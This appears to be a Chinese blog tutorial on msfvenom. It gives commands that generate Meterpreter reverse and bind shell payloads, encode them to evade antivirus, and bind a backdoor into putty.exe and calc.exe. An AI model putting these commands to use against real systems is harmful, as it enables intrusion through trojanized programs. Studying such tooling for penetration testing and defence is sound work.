@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>【学习篇】msfvenom使用 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    833 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      3 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2019 , 八月 19日 星期一, 9:04 晚上</p>
+            
+            <div class="markdown-body">
+              <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>msfvenom 是msf框架配套的攻击载荷生成器</p>
+<p>什么是攻击载荷: <code>payload</code> 目标系统上渗透成功后执行的代码</p>
+<a id="more"></a>
+
+<p>msfvenom命令行选项如下<br><img src="/images/Linux/kali/msfvenom/0.png" srcset="/img/loading.gif" alt=""></p>
+<hr>
+<h2 id="本文仅提供技术参考-请勿用作非法用途-一旦发生后果自负-作者概不负责"><a href="#本文仅提供技术参考-请勿用作非法用途-一旦发生后果自负-作者概不负责" class="headerlink" title="本文仅提供技术参考,请勿用作非法用途,一旦发生后果自负!作者概不负责"></a>本文仅提供技术参考,请勿用作非法用途,一旦发生后果自负!作者概不负责</h2><hr>
+<!--more-->
+
+
+<h1 id="p-自定义有效载荷"><a href="#p-自定义有效载荷" class="headerlink" title="-p 自定义有效载荷"></a>-p 自定义有效载荷</h1><p>查看全部有效载荷</p>
+<pre><code>msfvenom -l payload</code></pre><p>查看windows/meterpreter/下的的攻击载荷</p>
+<pre><code>locate windows/meterpreter</code></pre><p>指定有效载荷</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp</code></pre><hr>
+<h1 id="l-载荷列表"><a href="#l-载荷列表" class="headerlink" title="-l 载荷列表"></a>-l 载荷列表</h1><p>模块类型包括:<code>payloads</code>,<code>encoders</code>,<code>nps</code>,<code>all</code></p>
+<p>查看所有</p>
+<pre><code>msfvenom -l</code></pre><hr>
+<h1 id="f-生成文件的格式"><a href="#f-生成文件的格式" class="headerlink" title="-f 生成文件的格式"></a>-f 生成文件的格式</h1><p>指定<code>.exe</code>为有效载荷的格式</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -f exe</code></pre><p>看支持哪些格式</p>
+<pre><code>Error: Executable formats
+    asp, aspx, aspx-exe, dll, elf, elf-so, 
+exe, exe-only, exe-service, exe-small, hta-psh, 
+loop-vbs, macho, msi, msi-nouac, osx-app, psh, 
+psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war
+Transform formats
+    bash, c, csharp, dw, dword, hex, java, js_be, js_le, 
+num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</code></pre><p>正常情况下使用</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=4444 -f exe -o /tmp/x.exe</code></pre><hr>
+<h1 id="a-选择架构平台"><a href="#a-选择架构平台" class="headerlink" title="-a 选择架构平台"></a>-a 选择架构平台</h1><p>–a (–platform)</p>
+<blockquote>
+<p>–arch<br>x86 | x64 | x86_64</p>
+</blockquote>
+<pre><code>--platform
+windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi
+
+netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</code></pre><hr>
+<h1 id="e-免杀编码"><a href="#e-免杀编码" class="headerlink" title="-e 免杀编码"></a>-e 免杀编码</h1><p>查看编码的方法</p>
+<pre><code>msfvenom -l encoders</code></pre><p>使用例子</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</code></pre><hr>
+<h1 id="n-空字段模块-为了绕过和免杀"><a href="#n-空字段模块-为了绕过和免杀" class="headerlink" title="-n 空字段模块/为了绕过和免杀"></a>-n 空字段模块/为了绕过和免杀</h1><p>查看nops选项</p>
+<pre><code>msfvenom -l npos</code></pre><hr>
+<h1 id="s-生成payload的文件大小"><a href="#s-生成payload的文件大小" class="headerlink" title="-s 生成payload的文件大小"></a>-s 生成payload的文件大小</h1><pre><code>msfvenom -p windows/meterpreter/reverse_tcp --arch x86 --platform windows -s 8000 -i 20 lhost=192.168.1.1 lport=6666 -f.exe &gt; ./x.exe</code></pre><hr>
+<h1 id="o-文件输出"><a href="#o-文件输出" class="headerlink" title="-o 文件输出"></a>-o 文件输出</h1><p>-o 输出参数可以用<code>&gt;</code>号代替<br>-f 指定格式参数可以用单个大写字母代替：</p>
+<pre><code>[H]arp
+[P]erl
+Rub[Y]
+[R]aw
+[J]s
+e[X]e
+[D]ll
+[V]BA
+[W]ar
+Pytho[N]</code></pre><p>将payload注入到putty中，并编码</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /root/下载/putty.exe -k -f exe -o /root/桌面/putty_evil.exe</code></pre><hr>
+<h1 id="b-避免使用的字符"><a href="#b-避免使用的字符" class="headerlink" title="-b 避免使用的字符"></a>-b 避免使用的字符</h1><p>避免出现坏字符,msfvenom会自动找到一个合适的编辑器的有效载荷进行编码</p>
+<p>例如</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw</code></pre><hr>
+<h1 id="c-添加自己的shellcode"><a href="#c-添加自己的shellcode" class="headerlink" title="-c 添加自己的shellcode"></a>-c 添加自己的shellcode</h1><blockquote>
+<p>-c 自己编写的shellcode文件绝对路径</p>
+</blockquote>
+<hr>
+<h1 id="i-编码次数"><a href="#i-编码次数" class="headerlink" title="-i 编码次数"></a>-i 编码次数</h1><p>迭代编码也许会有规避杀毒软件的作用，但这不是真正的免杀。</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</code></pre><hr>
+<h1 id="x-k-捆绑"><a href="#x-k-捆绑" class="headerlink" title="-x | -k 捆绑"></a>-x | -k 捆绑</h1><p>原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面</p>
+<p><code>-x</code> 指定一个exe文件作为模板<br><code>-k</code> 保护模板程序的功能,注入的payload作为一个新的进程运行，一般只在老程序中有效<br>例如:<code>windows xp</code></p>
+<p>msfvenom使用的模板文件保存在目录<code>msf/data/templates</code></p>
+<p>（模板文件=宿主文件=自定义的可执行文件）</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</code></pre><p>-x calc.exe 捆绑payload到 正常文件<br>使用windows下的calc.exe作为模板文件,生成payload</p>
+<p><code>也可以使用自己自定义的可执行文件</code></p>
+<blockquote>
+<p>-x 可执行文件绝对路径</p>
+</blockquote>
+<hr>
+<h1 id="h-帮助"><a href="#h-帮助" class="headerlink" title="-h 帮助"></a>-h 帮助</h1><pre><code>msfvenom -h</code></pre><hr>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a><br><a href="http://blog.csdn.net/lzhd24/article/details/50664342" target="_blank" rel="noopener">http://blog.csdn.net/lzhd24/article/details/50664342</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzA4NDk5NTYwNw==&amp;mid=2651425199&amp;idx=1&amp;sn=9032db8ea0d6484b072ae72adca859c6&amp;chksm=842392d7b3541bc1ff1f1e9e03c3a918b2aee9b555cd5c3c27bfb72dcd0f066e1325020d506f&amp;mpshare=1&amp;scene=23&amp;srcid=03179H3uWCT5qy3q4cZ3hsF0#rd" target="_blank" rel="noopener">http://mp.weixin.qq.com/s?__biz=MzA4NDk5NTYwNw==&amp;mid=2651425199&amp;idx=1&amp;sn=9032db8ea0d6484b072ae72adca859c6&amp;chksm=842392d7b3541bc1ff1f1e9e03c3a918b2aee9b555cd5c3c27bfb72dcd0f066e1325020d506f&amp;mpshare=1&amp;scene=23&amp;srcid=03179H3uWCT5qy3q4cZ3hsF0#rd</a></p>
+<hr>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Linux/">Linux</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/kali/">kali</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/08/19/Python/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Python基础</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/08/19/Linux/kali/aircrack-ng%E7%A0%B4%E8%A7%A3WPA-WPA2/">
+                        <span>Ariceack-ng 破解 WPA-WPA2(Wifi)</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "【学习篇】msfvenom使用&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
